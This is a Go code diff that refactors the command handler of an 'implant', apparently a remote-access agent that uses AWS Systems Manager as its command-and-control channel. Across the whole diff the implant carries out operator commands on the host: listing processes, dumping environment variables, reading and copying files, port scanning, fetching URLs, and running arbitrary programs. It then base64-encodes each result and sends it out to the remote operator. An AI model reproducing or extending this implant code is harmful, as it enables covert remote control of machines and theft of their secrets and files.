@@ -38,26 +38,20 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 	switch arrCommandStr[0] {
 	case "ps":
 		procs := implantps.Ps()
-		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(strings.Join(procs[:], "\n")), instanceRegion)
-		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		validateCommand(cmdid, tokens, managedInstanceID, strings.Join(procs[:], "\n"), instanceRegion)
 	case "env":
 		data := implantenv.Env()
-		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
-		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
 	case "whoami":
 		user, _ := whoami.Whoami()
-		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(user.Username), instanceRegion)
-		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		validateCommand(cmdid, tokens, managedInstanceID, user.Username, instanceRegion)
 	case "pwd":
 		data, _ := pwd.Pwd()
-		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
-		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
 	case "portscan":
 		data := portscan.Portscan()
-		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
-		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
 	case "ls":
-		fmt.Println(arrCommandStr)
 		var path string
 		if len(arrCommandStr) == 1 {
 			path = "./"
@@ -66,51 +60,38 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 		}
 		list := implantls.Ls(path)
 		data := strings.Join(list, "\n")
-		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
-		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
 	case "cat":
 		data := cat.Cat(arrCommandStr[1])
-		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
-		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
 	case "cp":
 		data, err := implantcp.Copy(arrCommandStr[1], arrCommandStr[2])
 		if err == nil {
-			awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
-			awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+			validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
 		}
 	case "mv":
 		var args implantmv.Arguments
 		args.SourceFile = arrCommandStr[1]
 		args.DestinationFile = arrCommandStr[2]
 		data := implantmv.Mv(args)
-		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
-		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
 	case "curl":
 		data := implantcurl.Curl(arrCommandStr[1])
-		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
-		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
 	case "chmod":
 		intVar, _ := strconv.Atoi(arrCommandStr[2])
-		data := implantchmod.Chmod(arrCommandStr[1], intVar)
-		if data == true {
-			awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode("Chmod Success"), instanceRegion)
-		} else {
-			awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode("Chmod Failed"), instanceRegion)
-		}
-		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		implantchmod.Chmod(arrCommandStr[1], intVar)
+		validateCommand(cmdid, tokens, managedInstanceID, "", instanceRegion)
 	case "exec":
 		var args []string
 		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
 		args = arrCommandStr[2:]
 		data := implantexec.Exec(arrCommandStr[1], args)
-		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
-		//awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
 	case "cd":
 		if len(arrCommandStr) > 1 {
 			os.Chdir(arrCommandStr[1])
-			fmt.Println(wd.WorkingDir())
-			awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(wd.WorkingDir()), instanceRegion)
-			awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+			validateCommand(cmdid, tokens, managedInstanceID, wd.WorkingDir(), instanceRegion)
 			awsssm.UpdateInstanceInformation(tokens, managedInstanceID, instanceRegion)
 		}
 		return nil
@@ -118,12 +99,10 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 		os.Exit(0)
 	case "kill":
 		data := implantkill.Kill(arrCommandStr[1])
-		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
-		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
 	case "mkdir":
 		data := implantmkdir.Mkdir(arrCommandStr[1])
-		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
-		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		validateCommand(cmdid, tokens, managedInstanceID, data, instanceRegion)
 	default:
 		cmd := exec.Command(arrCommandStr[0], arrCommandStr[1:]...)
 		var out bytes.Buffer
@@ -133,13 +112,16 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 		err := cmd.Run()
 		if err != nil {
 			erout := fmt.Sprint(err) + ": " + stderr.String()
-			awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(erout), instanceRegion)
-			awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+			validateCommand(cmdid, tokens, managedInstanceID, erout, instanceRegion)
 			return nil
 		}
-		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(out.String()), instanceRegion)
-		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
+		validateCommand(cmdid, tokens, managedInstanceID, out.String(), instanceRegion)
 		return nil
 	}
 	return nil
+}
+
+func validateCommand(cmdid string, tokens awsrsa.AwsToken, managedInstanceID string, data string, instanceRegion string) {
+	awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data), instanceRegion)
+	awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid, instanceRegion)
 }
